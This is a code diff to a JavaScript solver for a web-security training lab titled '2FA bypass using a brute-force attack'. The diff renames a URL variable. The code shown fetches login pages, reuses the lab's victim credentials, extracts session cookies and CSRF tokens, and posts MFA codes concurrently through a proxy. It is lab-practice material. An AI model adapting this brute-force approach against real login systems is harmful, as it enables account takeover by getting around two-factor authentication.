@@ -3,7 +3,7 @@ import { pressEnterToContinue } from "../../../utils/pressEnterToContinue.js";
 import { runTasks } from "../../../utils/runTasks.js";
 import { sleep } from "../../../utils/sleep.js";
 
-const { url, concurrencyLimit, httpClient } = getParsedInput({
+const { labUrl, concurrencyLimit, httpClient } = getParsedInput({
   description: "Lab: 2FA bypass using a brute-force attack",
   concurrency: true,
   proxy: true,
@@ -68,14 +68,14 @@ async function task(index) {
 }
 
 async function getFromLogin() {
-  let response = await httpClient.get(url + "login");
+  let response = await httpClient.get(labUrl + "login");
   return [extractSessionCookie(response), extractCsrfToken(response)];
 }
 
 async function postToLogin(sessionCookie, csrfToken) {
   const victimsCredentials = { username: "carlos", password: "montoya" };
   const data = new URLSearchParams({ csrf: csrfToken, ...victimsCredentials });
-  const response = await httpClient.post(url + "login", data, {
+  const response = await httpClient.post(labUrl + "login", data, {
     headers: {
       cookie: sessionCookie,
     },
@@ -84,7 +84,7 @@ async function postToLogin(sessionCookie, csrfToken) {
 }
 
 async function getFromLogin2(sessionCookie) {
-  const response = await httpClient.get(url + "login2", {
+  const response = await httpClient.get(labUrl + "login2", {
     headers: {
       cookie: sessionCookie,
     },
@@ -94,7 +94,7 @@ async function getFromLogin2(sessionCookie) {
 
 async function postToLogin2({ sessionCookie, csrfToken, mfaCode }) {
   const data = new URLSearchParams({ csrf: csrfToken, "mfa-code": mfaCode });
-  return await httpClient.post(url + "login2", data, {
+  return await httpClient.post(labUrl + "login2", data, {
     headers: {
       cookie: sessionCookie,
     },
